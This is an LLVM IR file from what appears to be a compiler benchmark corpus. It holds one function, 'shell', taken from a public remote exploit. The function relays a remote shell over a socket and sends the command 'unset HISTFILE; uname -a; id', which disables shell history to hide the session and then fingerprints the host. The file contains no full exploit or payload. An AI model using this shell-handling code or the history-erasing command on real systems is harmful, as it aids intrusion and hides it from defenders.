; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23329.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23329.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [76 x i8] c"unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** oseen are chinese...'\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"[+] EOF\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"[+] Connection lost.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %7 = call i32 @FD_ZERO(i32* %3)
  %8 = load i32, i32* %2, align 4
  %9 = call i32 @FD_SET(i32 %8, i32* %3)
  %10 = call i32 @FD_SET(i32 0, i32* %3)
  %11 = load i32, i32* %2, align 4
  %12 = load i8*, i8** %5, align 8
  %13 = load i8*, i8** %5, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = call i64 @send(i32 %11, i8* %12, i32 %14, i32 0)
  br label %16

16:                                               ; preds = %1, %64
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @FD_SET(i32 %17, i32* %3)
  %19 = call i32 @FD_SET(i32 0, i32* %3)
  %20 = load i32, i32* %2, align 4
  %21 = add nsw i32 %20, 1
  %22 = call i64 @select(i32 %21, i32* %3, i32* null, i32* null, i32* null)
  %23 = icmp slt i64 %22, 0
  br i1 %23, label %24, label %25

24:                                               ; preds = %16
  br label %65

25:                                               ; preds = %16
  %26 = load i32, i32* %2, align 4
  %27 = call i64 @FD_ISSET(i32 %26, i32* %3)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %45

29:                                               ; preds = %25
  %30 = load i32, i32* %2, align 4
  %31 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %32 = call i32 @recv(i32 %30, i8* %31, i32 1024, i32 0)
  store i32 %32, i32* %6, align 4
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %34, label %38

34:                                               ; preds = %29
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %37 = call i32 @exit(i32 2) #3
  unreachable

38:                                               ; preds = %29
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %40 = load i32, i32* %6, align 4
  %41 = call i64 @write(i32 1, i8* %39, i32 %40)
  %42 = icmp slt i64 %41, 0
  br i1 %42, label %43, label %44

43:                                               ; preds = %38
  br label %65

44:                                               ; preds = %38
  br label %45

45:                                               ; preds = %44, %25
  %46 = call i64 @FD_ISSET(i32 0, i32* %3)
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %48, label %64

48:                                               ; preds = %45
  %49 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %50 = call i32 @read(i32 0, i8* %49, i32 1024)
  store i32 %50, i32* %6, align 4
  %51 = icmp slt i32 %50, 0
  br i1 %51, label %52, label %56

52:                                               ; preds = %48
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 @fprintf(i32 %53, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %55 = call i32 @exit(i32 2) #3
  unreachable

56:                                               ; preds = %48
  %57 = load i32, i32* %2, align 4
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %59 = load i32, i32* %6, align 4
  %60 = call i64 @send(i32 %57, i8* %58, i32 %59, i32 0)
  %61 = icmp slt i64 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %56
  br label %65

63:                                               ; preds = %56
  br label %64

64:                                               ; preds = %63, %45
  br label %16

65:                                               ; preds = %62, %43, %24
  %66 = load i32, i32* @stderr, align 4
  %67 = call i32 @fprintf(i32 %66, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %68 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
